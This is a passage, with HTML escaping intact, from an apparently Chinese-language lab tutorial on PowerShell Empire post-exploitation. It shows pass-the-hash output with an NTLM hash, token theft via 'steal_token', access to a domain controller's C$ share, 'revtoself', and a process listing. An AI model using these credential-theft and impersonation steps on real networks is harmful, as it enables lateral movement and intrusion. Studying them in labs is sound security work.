&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HACK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;program&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;impers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;no&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NTLM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de26cce0356891a4a020e7c4957afc72&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3396&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2204&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LSA&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;is&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LUID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2380581&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00245325&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msv1_0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;copy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0000000001451&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FB0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kerberos&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;copy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0000000001752&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A68&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256_hmac&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128_hmac&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rc4_hmac_nt&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rc4_hmac_old&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rc4_md4&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;           &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rc4_hmac_nt_exp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rc4_hmac_old_exp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OK&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00000000003&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;BCD88&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;steal&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;created&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°PIDçš„è¿›ç¨‹ä¸º3396ï¼Œæˆ‘ä»¬ä½¿ç”¨&lt;code&gt;steal_token PID&lt;/code&gt; è¿›è¡Œåˆ©ç”¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; steal_token &lt;span class=&#34;m&#34;&gt;3396&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7SU3EWKV to run Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Running As: WIN-JH8N3KV3OQ0&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-TokenManipulation completed!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Use credentials/tokens with RevToSelf option to revert token privileges
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¿›å…¥shellåŒè¿‡åˆšæ‰çªƒå–çš„ä»¤ç‰Œæ¥è®¿é—®Windows Server 2019 åŸŸæ§ä¸»æœºçš„ç›®å½•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨æŸ¥çœ‹è¿›ç¨‹PIDæ¥çªƒå–åŸŸç”¨æˆ·çš„ä»¤ç‰Œï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å¦‚æœæç¤ºé”™è¯¯ï¼ˆæˆ‘çš„å®¢æˆ·æœºWindows 7ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[!] error running command: The term &amp;lsquo;ConvertTo-Json&amp;rsquo; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and t&lt;/strong&gt;
ry again.&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯empireç°åœ¨è¿˜æœªæ”¯æŒä½ç‰ˆæœ¬powershellçš„é—®é¢˜ï¼Œå¯ä»¥æŠŠpowershellå‡çº§åˆ°4.0ï¼šhttps://www.jianshu.com/p/24b98eac766a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬å…ˆæ¢å¤ä»¤ç‰Œçš„æƒé™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; revtoself
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7SU3EWKV to run Task &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RevertToSelf was successful. Running as: WIN-JH8N3KV3OQ0&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“æˆ‘ä»¬å†æ¬¡è®¿é—®å·²ç»æç¤ºæ²¡æœ‰æƒé™äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; shell
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Exit Shell Menu with Ctrl+C
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n &amp;gt; dir &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;dc.hack.lab&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;$
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error: Cannot find path &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\dc.hack.lab\c$&amp;#39;&lt;/span&gt; because it does not exist. &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;or cannot be accessed&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨psæ¥æŸ¥çœ‹åŸŸç”¨æˆ·çš„PIDï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1480&lt;/span&gt;  winlogon       x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           2.75 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1576&lt;/span&gt;  explorer       x64   WIN-JH8N3KV3OQ0&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n         37.05 MB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1580&lt;/span&gt;  svchost        x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           2.64 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1680&lt;/span&gt;  VGAuthService  x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           0.93 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1708&lt;/span&gt;  vmtoolsd       x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           7.01 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1888&lt;/span&gt;  cmd            x64   HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser                 2.70 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1892&lt;/span&gt;  dllhost        x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           4.38 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;1980&lt;/span&gt;  conhost        x64   WIN-JH8N3KV3OQ0&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n         2.30 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2024&lt;/span&gt;  svchost        x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;OCAL SERVICE    1.69 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2076&lt;/span&gt;  rdpclip        x64   HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser                 5.83 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2080&lt;/span&gt;  dwm            x64   HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser                 4.55 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2228&lt;/span&gt;  msdtc          x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;ETWORK SERVICE  1.29 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2508&lt;/span&gt;  HipsTray       x86   HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser                 16.03 MB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2536&lt;/span&gt;  csrss          x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           5.79 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2608&lt;/span&gt;  taskhost       x64   WIN-JH8N3KV3OQ0&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n         6.69 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2620&lt;/span&gt;  mscorsvw       x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           8.22 MB   
